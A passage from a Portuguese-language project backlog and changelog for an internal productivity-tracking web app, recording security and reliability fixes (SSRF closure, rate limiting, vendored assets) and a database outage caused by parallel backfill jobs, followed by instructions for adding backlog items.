    entre DELETE e INSERT), agora coberta pelo drift-sweep D-1..D-7. Fazer só
    com staging ou janela de manutenção supervisionada + teste de crash.
  - Suíte 158→180.

- **2026-07-08/09 · `bbc5129`, `e4dc4c8`, `c62bf4a`, `4a8e369`, `fa62e12`, `d2970da`**
  — Sequência de P1 concluída: `/health` real + SSRF `/wpa/probe` + remoção de
  stack trace (P1-2/4/10); snapshot_last_ok + git hook pre-push + watchdog
  script (P1-1/3/6); vendorização Leaflet+Roboto (P1-9); retry natural
  MD/SF/DD (P1-7); rate limit + scrypt com compat (P1-5). E `d2970da`:
  `detectDrift` passou a usar `_aggregateTeamDailyTotals` (dedup por note-id +
  `_notaDate`) — antes contava ocorrências infladas e gerava drift fantasma.

- **2026-07-09 · INCIDENTE (Postgres down) + recuperação completa** — Ver P0-0.
  Resumo: backfill rodado como **60 processos node paralelos** derrubou o
  Postgres por OOM (VM 3.8GB sem swap). Banco ficou `down` ~2min, auto-recuperou
  via systemd. Produção restaurada (`pm2 restart` + reconexão). **Bug de
  over-counting confirmado e corrigido**: equipe que reloga carrega as mesmas
  concluídas em cada sessão → produtividade inflava ~8x (ECCSJ82: 18 notas
  reais → 143). O fix de dedup (já em código) + `detectDrift` alinhado (d2970da)
  zeraram o drift. **Todo o histórico 09/05→08/07 re-consolidado** com backfill
  de **1 processo, sequencial** (30s, sem incidente). Validação: 01/07 diff
  1810→854→0; amostras 15/06, 30/06, 05/07 todas `has_drift: false`. Números
  reportados à EDP agora corretos. Abriu **P0-0** (swap + auto-restart + backfill
  discipline). Lição no RUNBOOK: NUNCA backfill em N processos.

**Restam em P0:** P0-0 (swap + auto-restart — pedido à TI), P0-1 (continuidade
humana — organizacional), P0-2 (backup offsite — rclone + OneDrive). Todos
exigem ação na VM/organização; não são executáveis por AI sozinha.

**P1 restante:** P1-11 (`consolidateDay` transacional — requer staging).

- **2026-07-08 · `bbc5129`** — **P1-2, P1-4, P1-10**. `/health` movido pra antes
  do catch-all + check real (SELECT 1 + idade do snapshot, 503 se degradado).
  SSRF do `/api/wpa/probe` fechado (`_wpaPathSeguro`: exige `/api/`, proíbe
  host embutido) — 2 testes de contrato. Stack trace parou de vazar ao cliente.

- **2026-07-08 · `e4dc4c8`** — **P1-3, P1-6, P1-1(script)**. `snapshot_last_ok`/
  `snapshot_error` em `app_settings`, expostos em `/admin/health`
  (`snapshot_stale_min`). Git hook `pre-push` roda `node --test` (via
  `hooks/pre-push` + `scripts/install-hooks.sh`). `scripts/watchdog.sh` pronto
  — **falta o José**: criar Teams Incoming Webhook + agendar no crontab
  (`*/15 * * * *`). Instruções no cabeçalho do script.

- **2026-07-08 · `c62bf4a`** — **P1-9**. Leaflet (js+css+imagens),
  polylineDecorator e Roboto (4 TTF) vendorizados em `vendor/`. Zero CDN no
  `index.html` — Fortinet não derruba mais Mapa/Deslocamentos.

- **2026-07-08 · `4a8e369`** — **P1-7**. `safeJson` distingue transiente (5xx/
  rede → retry) de definitivo (4xx → OUTROS). MD/SF/DD retornam null em falha
  transiente do fetch primário → UUID fica fora do cache e retenta no ciclo
  seguinte. 5 testes novos. **Nota:** cobre subcategorias (MD/SF/DD). As
  REJEIÇÕES (`classificarRejeicao`) ainda gravam "sem motivo" em fetch falho —
  fica como sub-item pendente de P1-7 (mesmo padrão: retornar null em
  FETCH_FAILED e o caller `runClassifyRejections` pular). Menor impacto (é
  indicador secundário), mas vale fechar.

**Próximo item de código puro:** P1-5 (rate limit `/auth/login` + scrypt).
Depois entra P2. P0-1/P0-2/P1-1(config)/P1-11 dependem de você (VM/org/staging).

---

# Como adicionar novo item ao backlog

1. Descubra a categoria (Governança/Segurança/Dados/Ops/Backend/Frontend/Qualidade).
2. Avalie severidade contra o contrato EDP (P0 se ameaça contrato, P1 se
   ameaça continuidade operacional, P2 se ameaça velocidade de resposta,
   P3 se é higiene).
3. Colete evidência `file:line` — se não tiver, ache antes.
4. Escreva no formato dos itens acima. **Não pule campos.**
5. Insira na posição correta por severidade (não anexe no fim se for P0).
6. Renumere se necessário (`P1-N` → mantenha únicos).
7. Commit com mensagem `docs(backlog): adiciona item P1-N — <título curto>`.
